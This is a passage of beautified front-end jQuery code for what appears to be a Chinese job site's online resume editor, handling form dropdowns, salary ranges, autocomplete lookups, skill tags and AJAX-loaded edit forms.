        var i, n, a, o = e.find("input[name=industryStr]").length ? e.find("input[name=industryStr]") : e.find("input[name=industryCategory]"), s = e.find("input[name=industryCodes]").length ? e.find("input[name=industryCodes]") : e.find("input[name=industryCode]");
        o.length && (i = [],
        n = o.val().split("·"),
        a = s.val().split("·"),
        $.each(a, function(e, t) {
            i.push({
                name: n[e],
                code: a[e]
            })
        }),
        o.industry({
            multiple: !e.find("input[name=industryCategory]").length
        }).data("selected", i).on("selected.industry", function(e, t) {
            o.closest("dd").find(".tip-text").hide();
            var i = []
              , n = [];
            $.isArray(t) ? ($.each(t, function(e, t) {
                i.push(t.name),
                n.push(t.code)
            }),
            o.val(i.join("·")),
            s.val(n.join("·"))) : (o.val(t.name),
            s.val(t.code))
        }))
    },
    prettyRadio: function(e) {
        var n = this;
        (e = e || $(document)) && e.find(".radio-list").each(function() {
            var e = n.hasJsResumeRadioSelect($(this))
              , t = $(this)
              , i = t.find('input[type="hidden"]');
            t.on("click", "label", function() {
                $(this).hasClass("ipt-disabled") || (e ? n.notSelectRadio() : n.selectRadio(t, i, $(this)),
                t.find("label").removeClass("radio-checked"),
                $(this).addClass("radio-checked"),
                i.val($(this).attr("data-val")))
            })
        })
    },
    notSelectRadio: function() {
        $.toast("已实名认证用户不可修改性别", "warning")
    },
    selectRadio: function(e, t, i) {
        e.find("label").removeClass("radio-checked"),
        i.addClass("radio-checked"),
        t.val(i.attr("data-val"))
    },
    hasJsResumeRadioSelect: function(e) {
        return !!e.hasClass("js-resume-radio-select")
    },
    dropSelect: function(d) {
        var e, t, i, r, n;
        function c(e, t, i) {
            if (t.hasClass("ipt-range") && "start" == t.attr("data-range")) {
                var n = t.closest(".form-row")
                  , t = (t.closest("dd").find(".dropdown-menu ul").find("li").last().attr("data-val"),
                n.find('.ipt-range[data-range="end"]'))
                  , n = t.parent().find('input[type="hidden"]')
                  , a = t.closest("dd").find(".dropdown-menu ul")
                  , o = d.find('input[name="degree"]').val()
                  , s = parseInt(e.attr("data-val"), 10) || parseInt(e.val(), 10)
                  , e = s + {
                    209: 6,
                    208: 5,
                    206: 6,
                    202: 5,
                    203: 8,
                    204: 5,
                    205: 8
                }[o]
                  , r = ""
                  , c = ((new Date).getFullYear(),
                s + {
                    209: 3,
                    208: 3,
                    206: 3,
                    202: 3,
                    203: 4,
                    204: 3,
                    205: 4
                }[o]);
                if (s)
                    if (o) {
                        if (1989 == s)
                            r = '<li data-val="1989" ka="edu-end-' + l + '">1990年以前</li>';
                        else
                            for (var l = e; s < l; l--)
                                r += '<li data-val="' + l + '" ka="edu-end-' + l + '">' + l + "</li>";
                        a.html(r),
                        i || (t.val(a.find("li:last").text()),
                        n.val(a.find("li:last").attr("data-val")),
                        t.val(c),
                        n.val(c))
                    } else
                        $.toast({
                            type: "error",
                            content: "请先选择学历"
                        })
            }
        }
        function a(e, t) {
            FormsUI.appointedBlueCollarPosition.length || $.ajax({
                type: "GET",
                url: "/wapi/zpgeek/common/data/bluecollarposition.json",
                dataType: "json",
                async: !1,
                success: function(e) {
                    0 === e.code && e.zpData && (FormsUI.appointedBlueCollarPosition = e.zpData)
                }
            }),
            0 <= FormsUI.appointedBlueCollarPosition.indexOf(t) ? (e.closest(".form-work").find("textarea[name=responsibility]").removeAttr("data-range").closest("dd").find(".tip-text").remove(),
            e.closest(".form-resume").find("textarea[name=responsibility]").removeClass("required").removeAttr("data-range").closest("dd").find(".tip-text").remove().end().closest("dl").find("dt").html("工作内容（选填）")) : (e.closest(".form-work").find("textarea[name=responsibility]").attr("data-range", "5,1600"),
            e.closest(".form-resume").find("textarea[name=responsibility]").addClass("required").attr("data-range", "5,1600").closest("dl").find("dt").html("工作内容"))
        }
        (d = d || $(document)) && ((t = (e = d.find('input[placeholder="选择职位类型"], input[placeholder="您的职位"]').next('input[name="position"]')) ? e.val() : "") && a(e, t),
        0 === FormsUI.eq && (i = new $.Position,
        $(document).on("click", 'input[placeholder="选择期望职位"]', function() {
            var t = $(this)
              , e = "undefined" != typeof isGeekIntern && isGeekIntern;
            i.init({
                data: e ? "/wapi/zpCommon/data/intern.json" : jobData,
                onlyTwoLevel: e,
                callback: function(e) {
                    t.val(e[2].name),
                    t.next().val(e[2].code)
                },
                hasSearch: !0
            })
        }),
        $(document).on("click", 'input[placeholder="选择职位类型"], input[placeholder="您的职位"]', function() {
            var t = $(this);
            i.init({
                data: jobData,
                callback: function(e) {
                    t.val(e[2].name),
                    t.next().val(e[2].code),
                    t.next().attr("level2", e[1].code),
                    t.next().attr("level3", e[2].code),
                    $('input[placeholder="选择技能标签"]').val(""),
                    $('input[placeholder="选择技能标签"]').next().val(""),
                    $(".select-tags .industry-cells").html(""),
                    Resume.getSkillsData({
                        p1: e[2].code,
                        p2: e[1].code
                    }, !0),
                    t.closest("dd").find(".tip-text").hide(),
                    "选择职位类型" == t.attr("placeholder") && t.closest(".form-row").find('input[name="positionName"]').val(e[2].name),
                    "guide" == t.data("type") && Guide.showSugSkillTag(e[2].code),
                    a(t, e[2].code)
                },
                hasSearch: !0
            })
        }),
        FormsUI.eq = 1),
        d.find(".dropdown-select").each(function() {
            var e = $(this)
              , t = e.find('.ipt-range[data-range="start"]')
              , i = e.find('input[name="highSalary"]');
            e.on("click", function() {
                $(this).hasClass("dropdown-disabled") || ($(this).hasClass("dropdown-select-open") || (d.find(".dropdown-select-open").removeClass("dropdown-select-open"),
                d.find(".dropdown-menu-open").removeClass("dropdown-menu-open")),
                $(this).toggleClass("dropdown-select-open"),
                e.next(".dropdown-menu").toggleClass("dropdown-menu-open"))
            }),
            e.find('.ipt-range[data-range="end"]') && c(t, t, !0),
            "" == i.val() && (i.closest(".dropdown-select").addClass("dropdown-disabled"),
            i.closest(".dropdown-select").find(".ipt").attr("disabled", "disabled"))
        }),
        r = d.find("input[name=eduType]").siblings(".edu-type"),
        n = d.find("input[name=eduType]").val(),
        r.length && r.find(".btn").each(function() {
            0 < n && (n == $(this).attr("data-val") ? $(this).attr("class", "btn btn-outline") : $(this).attr("class", "btn btn-slight")),
            $(this).on("click", function() {
                $(this).hasClass("btn-slight") && ($(this).removeClass("btn-slight").addClass("btn-outline"),
                $(this).siblings().removeClass("btn-outline").addClass("btn-slight")),
                r.next().val($(this).attr("data-val"))
            })
        }),
        d.find(".dropdown-menu").each(function() {
            var i = $(this)
              , n = i.prev(".dropdown-select")
              , a = n.find("input[readonly]")
              , o = n.find('input[type="hidden"]')
              , s = i.find(".select-tree")
              , e = i.find(".tags-cells");
            s.length && (3 == s.attr("data-level") && s.html('<ul class="tree-1"></ul><ul class="tree-2"></ul><ul class="tree-3"></ul>'),
            2 == s.attr("data-level") && s.html('<ul class="tree-1"></ul><ul class="tree-2"></ul>'),
            FormsUI.getTreeData(s, jobData)),
            e.length && void 0 !== Resume && Resume.getTag(d, !0),
            i.on("click", "li", function() {
                var e, t = $(this).parent().parent().siblings(".edu-type");
                if (r.length && t.length && ($(this).attr("data-val") <= 205 ? ($(r).removeClass("hide"),
                $(r.find(".btn")[0]).attr("class", "btn btn-outline"),
                $(r.find(".btn")[1]).attr("class", "btn btn-slight"),
                r.next().val(1)) : ($(r).hasClass("hide") || $(r).addClass("hide"),
                $(r.find(".btn")[0]).attr("class", "btn btn-outline"),
                $(r.find(".btn")[1]).attr("class", "btn btn-slight"),
                r.next().val(""))),
                $(this).closest(".select-tree").length) {
                    t = $(this).closest(".select-tree").attr("data-level");
                    if ($(this).parent().find("li").removeClass("selected"),
                    $(this).addClass("selected"),
                    3 == t) {
                        if ($(this).closest(".tree-1").length)
                            return $(this).closest(".select-tree").find(".tree-3").hide(),
                            FormsUI.getTreeData(s, jobData, $(this).attr("data-id")),
                            !1;
                        if ($(this).closest(".tree-2").length)
                            return $(this).closest(".select-tree").find(".tree-3").show(),
                            o.attr("level2", $(this).attr("data-id")),
                            FormsUI.getTreeData(s, jobData, $(this).closest(".select-tree").find(".tree-1 .selected").attr("data-id"), $(this).attr("data-id")),
                            !1
                    }
                    if (2 == t) {
                        if ($(this).closest(".tree-1").length)
                            return $(this).closest(".select-tree").find(".tree-3").hide(),
                            FormsUI.getTreeData(s, jobData, $(this).attr("data-id")),
                            !1;
                        if ($(this).closest(".tree-2").length)
                            return $(this).closest(".select-tree").find(".tree-3").show(),
                            o.attr("level2", $(this).attr("data-id")),
                            FormsUI.getTreeData(s, jobData, $(this).closest(".select-tree").find(".tree-1 .selected").attr("data-id"), $(this).attr("data-id")),
                            !1
                    }
                }
                c($(this), a),
                a.val($(this).text()),
                void 0 !== $(this).data("val") && o.val($(this).attr("data-val")),
                o.closest("dd").find(".tip-text").remove(),
                i.removeClass("dropdown-menu-open"),
                n.removeClass("dropdown-select-open"),
                "position" == o.attr("name") && ((e = $(this).closest(".form-resume").find(".select-tags")).closest("dd").find(".ipt").val(""),
                e.closest("dd").find('input[type="hidden"]').val(""),
                Resume.getTag(e.closest(".form-resume"))),
                "position" == o.attr("name") && $(this).closest(".form-work") && ((e = $(this).closest(".form-work").find(".select-tags")).closest("dd").find(".ipt").val(""),
                e.closest("dd").find('input[type="hidden"]').val(""),
                Resume.getTag(e.closest(".form-work")))
            })
        }),
        $(document).on("click", function(e) {
            $(e.target).closest(".dropdown-menu").length || $(e.target).closest(".dropdown-select").length || (d.find(".dropdown-select").removeClass("dropdown-select-open"),
            d.find(".dropdown-menu").removeClass("dropdown-menu-open"))
        }))
    },
    getTreeData: function(e, t, i, n) {
        for (var a, o, s = "", r = "", c = "", l = 0; l < t.length; l++) {
            var d = t[l].children;
            if (s += '<li data-id="' + t[l].id + '">' + t[l].name + "</li>",
            d && i && t[l].id == i)
                for (a = 0; a < d.length; a++) {
                    var p = d[a].children;
                    if (r += '<li data-id="' + d[a].id + '">' + d[a].name + "</li>",
                    p && n && d[a].id == n)
                        for (o = 0; o < p.length; o++)
                            c += '<li data-val="' + p[o].id + '">' + p[o].name + "</li>"
                }
        }
        i || (e.find(".tree-1").html(s),
        e.find(".tree-2").html('<li class="blank">选择职类</li>')),
        n ? e.find(".tree-3").html(c) : i && e.find(".tree-2").html(r)
    },
    setMinSlary: function() {
        var e = Salary.min()
          , i = '<li data-val="面议">面议</li>';
        $.each(e, function(e, t) {
            i += '<li data-val="' + t + '">' + t + "K</li>"
        }),
        FormsUI.formEl.find(".start-salary .dropdown-menu ul").html(i),
        FormsUI.changeSalary(FormsUI.formEl.find("input[name=lowSalary]").val(), !0)
    },
    changeSalary: function(e, t) {
        var i, n, a, o, s, r;
        e && (i = (a = $(".end-salary")).find(".ipt"),
        n = a.find('input[type="hidden"]'),
        a = a.find("ul"),
        o = 0,
        (e = e) && (i.closest(".dropdown-select").removeClass("dropdown-disabled").parent().parent().find(".range-devide").show(),
        i.removeAttr("disabled")),
        "面议" == e ? (i.val("面议").parent().hide().parent().parent().find(".range-devide").hide(),
        n.val("面议")) : (e = parseInt(e, 10),
        i.val(i.val() + "K").parent().show(),
        s = Salary.max(parseInt(e, 10)),
        r = "",
        $.each(s, function(e, t) {
            r += '<li data-val="' + t + '">' + t + "K</li>"
        }),
        a.html(r),
        o = s[0]),
        t && 0 == e && 0 == n.val() && i.parent().hide(),
        t || (i.val(o + "K"),
        n.val(o)))
    },
    getSuggest: function(el) {
        var el = el, url = el.attr("data-url"), keyword = el.val(), resultPannel = el.parent().find(".suggest-complete"), resultCon;
        "" == keyword ? resultPannel.removeClass("dropdown-menu-open") : (resultPannel.html("<ul></ul>").addClass("dropdown-menu"),
        resultCon = resultPannel.find("ul"),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: {
                query: keyword
            },
            success: function(result) {
                var result = result.data, str = "", i;
                if ("string" == typeof result && (result = eval("(" + result + ")")),
                result && result.length) {
                    for (i = 0; i < result.length; i++)
                        str += '<li data-val="' + result[i].code + '">' + (result[i].country ? '<span class="ignore">' + result[i].country + "</span>" : "") + result[i].hlname + "</li>";
                    resultCon.html(str),
                    resultPannel.addClass("dropdown-menu-open")
                }
            },
            error: function(e) {}
        }))
    },
    setSuggest: function(e) {
        var t = e.closest("dd").find(".ipt")
          , i = e.closest("dd").find('input[name="location"]')
          , n = e.closest("dd").find('input[type="hidden"]')
          , a = e.clone();
        a.find(".ignore").remove(),
        t.val(a.text()),
        i.val(e.attr("data-val")),
        n.val(e.attr("data-val")),
        e.closest(".suggest-complete").removeClass("dropdown-menu-open"),
        t.parent().find(".tip-text").remove()
    }
})
  , ResumeEditor = ($(function() {
    ($(".resume").length || $(".job-detail").length) && FormsUI.init()
}),
{
    init: function() {}
})
  , Resume = {
    ownerTags: [],
    skillsData: [],
    formStatus: !1,
    parserId: "",
    init: function() {
        var e;
        0 != $(".progress-score").length && (e = $(".progress-score").text(),
        $(".progress p").css("width", e)),
        Resume.canSubmit = !1,
        $(".resume-item").on("click", ".link-add", function(e) {
            Resume.getData($(this)),
            e.preventDefault()
        }),
        $(".resume-item:not('#resume-history,#resume-userinfo')").on("click", ".userinfo-con, .summary-con, .purpose-list>li, .history-project>li, .social-account>li", function(e) {
            Resume.getData($(this).find(".link-edit"))
        }),
        $("#resume-history").on("click", ".userinfo-con, .summary-con, .purpose-list>li, .history-project>li .item-form-list, .social-account>li", function(e) {
            return Resume.bookJobData($(this).find(".link-edit")),
            !1
        }),
        $(".resume-item").on("click", ".link-delete", function(e) {
            Resume.removeData($(this)),
            e.preventDefault(),
            e.stopPropagation()
        }),
        $("#resume-userinfo").on("click", ".link-edit", function(e) {
            Resume.getData($(this)),
            e.preventDefault(),
            e.stopPropagation()
        }),
        $(".resume-nav .link-edit").on("click", function(e) {
            var t = $(this).attr("data-target");
            Resume.getData($("#" + t).find(".link-edit")),
            e.preventDefault()
        }),
        $(".resume-nav .link-add").on("click", function(e) {
            var t = $(this).attr("data-target");
            Resume.getData($("#" + t).find(".link-add")),
            e.preventDefault()
        }),
        $(".prv-view-btn").on("click", function() {
            Resume.showPreviewResume()
        }),
        "undefined" != typeof editItem && (1 == editItem ? $("#resume-purpose .link-add").click() : 2 == editItem && $(".userinfo-con").click());
        Resume.isShowResumeAnalyzeTools(!0),
        $(document).on("click", ".paddingTop60 .go-detail", function() {
            $.ajax({
                url: "/wapi/zpgeek/resume/parser/querybar.json",
                type: "get",
                dataType: "json",
                success: function(e) {
                    e.zpData && e.zpData.showType && 1 === e.zpData.showType ? window.location.href = "/web/geek/resumeAnalyze?parserId=" + Resume.parserId : $.toast({
                        content: "对应附件已被删除",
                        type: "error"
                    })
                },
                error: function(e) {
                    $.toast({
                        content: e.message,
                        type: "error"
                    })
                }
            })
        }),
        $(document).on("click", ".paddingTop60 .close", function() {
            $.ajax({
                url: "/wapi/zpgeek/resume/parser/closebar.json",
                type: "post",
                dataType: "json",
                success: function(e) {
                    0 === e.code && ($(".resume-analyze-tools").remove(),
                    $(".resume").removeClass("paddingTop60"))
                },
                error: function(e) {
                    $.toast({
                        content: e.message,
                        type: "error"
                    })
                }
            })
        })
    },
    isShowResumeAnalyzeTools: function(i) {
        var n = !1;
        return $.ajax({
            url: "/wapi/zpgeek/resume/parser/querybar.json",
            type: "get",
            dataType: "json",
            success: function(e) {
                if (e.zpData && e.zpData.showType && 1 === e.zpData.showType) {
                    var t = e.zpData.parserId
                      , e = e.zpData.resumeName;
                    Resume.parserId = t,
                    Resume.showResumeAnalyzeTools(e),
                    n = !0;
                    try {
                        _T.sendEvent("to_resume_expose")
                    } catch (e) {}
                } else
                    i && Resume.badResume()
            },
            error: function(e) {
                $.toast({
                    content: e.message,
                    type: "error"
                }),
                i && Resume.badResume()
            }
        }),
        n
    },
    showResumeAnalyzeTools: function(e) {
        e = '<div class="resume-analyze-tools"><p><span class="name-text">' + ("已为您解析了附件【" + e + "】的内容，您可将解析结果补充到在线简历中") + '</span><span class="go-detail" ka="to_resume_click">去查看</span></p><p class="close" ka="to_resume_cancel"></p></div>';
        $(".resume").addClass("paddingTop60"),
        $(".paddingTop60").append(e)
    },
    showPreviewResume: function() {
        $.dialog({
            title: "",
            content: '<div class="frame-preview-resume"><iframe src="/geek/resume/preview"></iframe></div>',
            closeText: !0,
            confirmText: "",
            cancelText: "",
            wrapClass: "dialog-layer-full dialog-resume-full",
            lock: !0,
            onOpen: function(e) {
                $("body").css("overflow", "hidden")
            },
            onClose: function() {
                $("body").css("overflow", "visible")
            }
        })
    },
    unique: function(e, t) {
        if (e.length < 2)
            return [e[0]];
        for (var i = {}, n = [], a = 0; a < e.length; a++) {
            var o = e[a]
              , s = !!t && typeof i[o] != typeof o;
            void 0 !== i[o] && !s || (i[o] = o,
            n.push(o))
        }
        return n
    },
    selectMajorInit: function() {
        $(".dropmajor").suggestion({
            onRequest: function(e, t) {
                e ? $.ajax({
                    url: "/autocomplete/major.json",
                    data: {
                        query: e || ""
                    },
                    type: "get",
                    dataType: "json",
                    success: function(e) {
                        e && e.data instanceof Array && (e = e.data.map(function(e) {
                            return "<li data-code=" + e.id + ">" + e.hlname + "</li>"
                        }).join(""),
                        t(e))
                    }
                }) : t("")
            },
            onChecked: function(e, t) {
                e && e.length && (e = $(".dropmajor").find(".suggestion-ipt").val(e.text()),
                Validate.check(e, !1, null))
            }
        })
    },
    selectSchoolInit: function() {
        $(".dropschool").suggestion({
            onRequest: function(e, t) {
                e ? $.ajax({
                    url: "/autocomplete/school.json",
                    data: {
                        query: e || ""
                    },
                    type: "get",
                    dataType: "json",
                    success: function(e) {
                        e && e.data instanceof Array && (e = e.data.map(function(e) {
                            return "<li data-code=" + e.code + "><i>" + e.country + "</i><em>" + e.hlname + "</em></li>"
                        }).join(""),
                        t(e))
                    }
                }) : t("")
            },
            onChecked: function(e, t) {
                var i;
                e && e.length && (i = $(".dropschool").find(".suggestion-ipt").val(e.find("em").text()),
                $(".dropschool").find("input[type=hidden]").val(e.data("code")),
                Validate.check(i, !1, null))
            }
        })
    },
    eduTypeInit: function(e) {
        var t = e.find("input[name=degree]").val()
          , i = e.find(".edu-type")
          , n = i.find("input[name=eduType]").val();
        t <= 205 && (i.removeClass("hide"),
        i.find(".btn").each(function(e, t) {
            $(this).attr("data-val") == n && ($(this).removeClass("btn-slight").addClass("btn-outline"),
            $(this).siblings().removeClass("btn-outline").addClass("btn-slight")),
            $(this).on("click", function() {
                $(this).hasClass("btn-slight") && ($(this).removeClass("btn-slight").addClass("btn-outline"),
                $(this).siblings().removeClass("btn-outline").addClass("btn-slight")),
                i.find("input[name=eduType]").val($(this).attr("data-val"))
            })
        })),
        e.find('input[name="degree"]').closest("dd").find(".dropdown-menu li").on("click", function() {
            $(this).attr("data-val") <= 205 ? (i.removeClass("hide"),
            $(i.find(".btn")[0]).attr("class", "btn btn-outline"),
            $(i.find(".btn")[1]).attr("class", "btn btn-slight"),
            i.find("input[name=eduType]").val("1")) : (i.hasClass("hide") || i.addClass("hide"),
            $(i.find(".btn")[0]).attr("class", "btn btn-outline"),
            $(i.find(".btn")[1]).attr("class", "btn btn-slight"),
            i.find("input[name=eduType]").val(""))
        })
    },
    selectCompanyInit: function(n) {
        $(".dropcompany").suggestion({
            onRequest: function(e, t) {
                e ? $.ajax({
                    url: "/wapi/zpgeek/autocomplete/company.json",
                    data: {
                        query: e || ""
                    },
                    type: "get",
                    dataType: "json",
                    success: function(e) {
                        (e = e.zpData.data) && e instanceof Array && (e = e.map(function(e) {
                            return "<li data-code=" + e.id + ">" + e.hlname + "</li>"
                        }).join(""),
                        t(e))
                    }
                }) : t("")
            },
            onChecked: function(e, t) {
                var i;
                e && e.length && (i = $(".dropcompany").find(".suggestion-ipt").val(e.text()),
                n && n(e.data("code")),
                Validate.check(i, !1, null))
            }
        })
    },
    getCompanyIndustry: function(e, t) {
        $.ajax({
            url: "/autocomplete/industry.json",
            data: {
                comId: e
            },
            type: "get",
            dataType: "json",
            success: function(e) {
                1 == e.rescode && (t.find('input[name="industryCategory"]').val(e.data.name),
                t.find('input[name="industryCode"]').val(e.data.code || ""))
            }
        })
    },
    selectCityInit: function() {
        var i = $('[name="locationName"]').val()
          , n = $('[name="location"]').val();
        $(".dropcity").citySelector({
            onLocation: function(e, t) {
                Resume.autoLocation = e.name;
                var i = $(this)
                  , n = i.find(".suggestion-ipt");
                e.name && !n.val() && (n.val(e.name).next().val(e.code),
                i.addClass("auto-location"),
                n.on("focus", function() {
                    i.removeClass("auto-location")
                }))
            },
            onChecked: function(e, t) {
                e && e.length && (i = e.data("name"),
                n = e.data("code")),
                $('[name="locationName"]', t).val(i),
                $('[name="location"]', t).val(n)
            }
        })
    },
    renderSkills: function(e) {
        var t, i = "";
        if ((e = Resume.owerSkillData && Resume.owerSkillData.length ? Resume.unique(e.concat(Resume.owerSkillData)) : e).length) {
            for (t = 0; t < e.length; t++)
                i += "<li><span>" + e[t] + "</span></li>";
            Resume.tagsPannel.find("ul").html(i)
        } else
            Resume.tagsPannel.find("ul").html('<div class="empty">输入标签名称，按回车添加</div>')
    },
    getLength: function(e) {
        for (var t = 0, i = (e = e.replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")).length, n = 0; n < i; n++)
            t += 255 < e.charCodeAt(n) ? 1 : .5;
        return Math.ceil(t)
    },
    listenSkills: function() {
        Resume.skillsContainer = $(".dropdown-skills"),
        Resume.tagsPannel = Resume.skillsContainer.find(".skills-pannel");
        var a = $(".ipt-tagsinput")
          , t = [];
        a.length && (a.removeAttr("readonly"),
        "" != a.val() && (t = a.val().split("·"),
        a.val(t.join(",")),
        Resume.owerSkillData = t),
        a.tagsinput({
            tagClass: "",
            maxTags: 3,
            confirmKeys: [13],
            addOnBlur: !1,
            itemText: function(e) {
                return this.itemValue(e)
            },
            typeahead: {
                autoSelect: !1,
                source: function(e) {
                    return Resume.unique(Resume.skillsData.concat(t))
                },
                menu: '<div class="result-selecter"></div>',
                appendTo: $(".dropdown-skills .dropdown-menu"),
                emptyItem: !0,
                afterSelect: function(e) {
                    this.$element.val(""),
                    Resume.tagsPannel.show(),
                    Resume.skillsContainer.addClass("dropdown-menu-open"),
                    Resume.skillsContainer.find(".result-selecter").hide()
                }
            },
            listTags: ".dropdown-skills .skills-pannel, .work-skill-tips",
            showListTags: function(e, t) {
                t.options.maxTags && t.itemsArray.length >= t.options.maxTags && Resume.skillsContainer.removeClass("dropdown-menu-open")
            }
        }),
        2 < Resume.skillsContainer.find(".dropdown-select .tag").length && Resume.skillsContainer.find(".bootstrap-tagsinput input").attr("placeholder", "").css("width", "60px"),
        a.on("itemAdded", function(e) {
            var t = !0
              , i = !1
              , n = e.item.replace(/</g, "&lt;").replace(/>/g, "&gt;");
            6 < Resume.getLength(n) && (i = !0),
            Resume.tagsPannel.find("li").each(function() {
                $(this).text() == n && (i = t = !1)
            }),
            i && (Resume.skillsContainer.find(".bootstrap-tagsinput .tag:last").find('span[data-role="remove"]').click(),
            Validate.showError(a, "最多允许输入6个中文字符")),
            t && !i && (Resume.tagsPannel.find("div.empty").remove(),
            Resume.tagsPannel.find("ul").append("<li><span>" + n + "</span></li>"),
            Resume.tagsPannel.show(),
            Resume.skillsContainer.find(".result-selecter").hide(),
            Resume.skillsData = Resume.unique(Resume.skillsData),
            Resume.skillsData.push(n)),
            i ? Resume.skillsContainer.find(".bootstrap-tagsinput input").css("width", "130px") : (Resume.skillsContainer.find("input").last().val($(this).val().split(",").join("·")),
            Validate.hideError(a),
            2 < Resume.skillsContainer.find(".dropdown-select .tag").length && Resume.skillsContainer.find(".bootstrap-tagsinput input").attr("placeholder", "").css("width", "60px"))
        }),
        a.on("itemRemoved", function(e) {
            Resume.skillsContainer.find(".result-selecter").hide(),
            Resume.skillsContainer.find("input").last().val($(this).val().split(",").join("·")),
            Resume.skillsContainer.find(".dropdown-select .tag").length || Resume.skillsContainer.find(".bootstrap-tagsinput input").attr("placeholder", "选择或输入技能标签").css("width", "130px"),
            setTimeout(function() {
                Resume.tagsPannel.parent().addClass("dropdown-menu-open")
            }, 0)
        }),
        Resume.skillsContainer.find(".dropdown-select .bootstrap-tagsinput input").attr("maxLength", "12"),
        Resume.tagsPannel.on("click", "li", function() {
            return !1
        }))
    },
    getSkillsData: function(e, t) {
        $.ajax({
            url: "/wapi/zpCommon/data/positionSkill",
            type: "GET",
            data: {
                positonLv2: e.p2,
                position: e.p1
            },
            dataType: "JSON",
            timeout: 3e4,
            success: function(e) {
                Resume.skillsData = e.zpData || [],
                Resume.renderSkills(e.zpData),
                $(".dropdown-skills .dropdown-select").css("pointer-events", "auto"),
                t && Resume.skillsContainer.find('.tag span[data-role="remove"]').trigger("click")
            }
        })
    },
    getTag: function(e, s) {
        var r = e.find(".tags-cells")
          , c = ""
          , l = ""
          , t = (r.closest("dd").find(".ipt"),
        e.find('input[name="position"]').attr("level2"))
          , e = e.find('input[name="position"]').attr("level3");
        t && $.ajax({
            type: "GET",
            url: " /wapi/zpCommon/data/positionSkill",
            dataType: "JSON",
            data: {
                positonLv2: t,
                position: e
            },
            success: function(e) {
                var t, e = e.zpData, i = "", n = r.closest("dd").find(".ipt").val().split("·"), a = [];
                if (0 < e.length) {
                    for (t = 0; t < e.length; t++)
                        i = -1 < $.inArray(e[t], n) ? ' class="selected"' : "",
                        l += "<span" + i + ' ka="tag-' + e[t] + '">' + e[t] + "</span>",
                        a.push(e[t]);
                    if (s)
                        for (var o = 0; o < n.length; o++)
                            -1 == $.inArray(n[o], a) && (Resume.ownerTags.push(n[o]),
                            c += '<span class="selected" ka="tag-' + n[o] + '">' + n[o] + "</span>")
                } else
                    l = '<div class="blank-tag">还未添加标签</div>';
                r.html(c + l)
            },
            error: function(e) {}
        })
    },
    getFormStatus: function(t) {
        $.dialog({
            content: '<div class="tip-text">退出编辑后，更新的内容不会自动保存</div>',
            title: "有内容没有保存，确定退出编辑吗？",
            type: "warning",
            closeText: !0,
            confirmText: "确定",
            cancelText: "取消",
            onConfirm: function(e) {
                t(),
                e.remove()
            },
            error: function() {}
        })
    },
    bookJobData: function(e) {
        var t = this;
        ($(".resume-item").hasClass("resume-item-open") || $(".resume-item").hasClass("resume-list-wrap-open")) && t.formStatus ? t.getFormStatus(function() {
            $("#resume-history").find(".edit-form-list").html("").end().find(".item-form").html(""),
            $(".resume-item").removeClass("resume-item-open").siblings(".resume-item").removeClass(".resume-item-open").removeClass(".resume-list-wrap-open"),
            e.hasClass("link-add") ? t.getDataShow(e) : t.EditDataForm(e),
            t.formStatus = !1
        }) : ($("#resume-history").find(".edit-form-list").html("").end().find(".item-form").html(""),
        e.hasClass("link-add") ? t.getDataShow(e) : t.EditDataForm(e))
    },
    getData: function(e) {
        var t = this;
        ($(".resume-item").hasClass("resume-item-open") || $(".resume-item").hasClass("resume-list-wrap-open")) && t.formStatus ? t.getFormStatus(function() {
            t.getDataShow(e),
            t.formStatus = !1
        }) : t.getDataShow(e)
    },
    EditDataForm: function(el) {
        var self = this
          , el = el
          , url = el.data("url")
          , nowResumeItem = el.closest("li")
          , formCon = nowResumeItem.find(".edit-form-list")
          , moduleName = nowResumeItem.attr("id");
        $(".resume-item").attr("class", "resume-item"),
        el.closest(".resume-item").addClass("resume-list-wrap-open"),
        nowResumeItem.removeClass("resume-list-open").siblings("li").removeClass("resume-list-open"),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: null,
            success: function(result) {
                var result = result, isAdd, $position, p2, p1, $position;
                "string" == typeof result && (result = eval("(" + result + ")")),
                1 == result.rescode ? (formCon.html(result.html),
                formCon = nowResumeItem.find(".edit-form-list"),
                nowResumeItem.addClass("resume-list-open"),
                formCon.find(".form-btns .btn-back").on("click", function(e) {
                    return el.closest(".resume-item").removeClass("resume-list-wrap-open"),
                    nowResumeItem.removeClass("resume-list-open"),
                    $("html,body").animate({
                        scrollTop: nowResumeItem.offset().top + "px"
                    }, 500),
                    !1
                }),
                formCon.find(".form-btns .btn-delete").unbind("click").on("click", function(e) {
                    Resume.removeData(el, $(this)),
                    e.preventDefault()
                }),
                isAdd = !1,
                result.resoper || (isAdd = !0),
                FormsUI.init(formCon.find("form"), isAdd),
                Validate.init(formCon.find("form"), isAdd),
                PlaceholderCheck.init(formCon.find("form")),
                $(".ipt-workyear").length && $(".ipt-workyear").workstartpicker(),
                formCon.find(".dropcity").length && (formCon.find(".dropcity .dropdown-select").off("click"),
                Resume.selectCityInit()),
                formCon.find(".dropdown-skills").length && (Resume.listenSkills(),
                $position = formCon.find('input[name="position"]'),
                p2 = $position.attr("level2"),
                p1 = $position.attr("level3"),
                p1 && p2 && Resume.getSkillsData({
                    p1: p1,
                    p2: p2
                }),
                $position = formCon.find('input[name="position"]'),
                $position.val() || (formCon.find(".dropdown-skills .dropdown-select").css("pointer-events", "none"),
                Resume.skillsContainer.on("click", function() {
                    $position.val() || Validate.showError(formCon.find('input[name="position"]'), "请先选择职位类型")
                }))),
                formCon.find(".dropcompany").length && Resume.selectCompanyInit(function(e) {
                    Resume.getCompanyIndustry(e, formCon)
                }),
                formCon.find(".dropschool").length && (Resume.selectSchoolInit(),
                Resume.selectMajorInit()),
                formCon.find(".serial-toolbar").length && $(".serial-area", formCon).textarealist(),
                "resume-userinfo" == moduleName && Resume.userinfoEvtInit(formCon),
                formCon.find("form").find("input,textarea").on("focus", function() {
                    self.formStatus = !0
                })) : Resume.showError(result.resmsg),
                $("html,body").animate({
                    scrollTop: formCon.offset().top + "px"
                }, 500),
                $(".ipt-workyear").length && $(".ipt-workyear").workstartpicker()
            },
            error: function(e) {
                Resume.showError()
            }
        })
    },
    getDataShow: function(el) {
        var self = this
          , el = el
          , url = el.data("url")
          , nowResumeItem = el.closest(".resume-item")
          , formCon = nowResumeItem.find(".item-form")
          , moduleName = nowResumeItem.attr("id");
        $(".resume-item").attr("class", "resume-item"),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: null,
            success: function(result) {
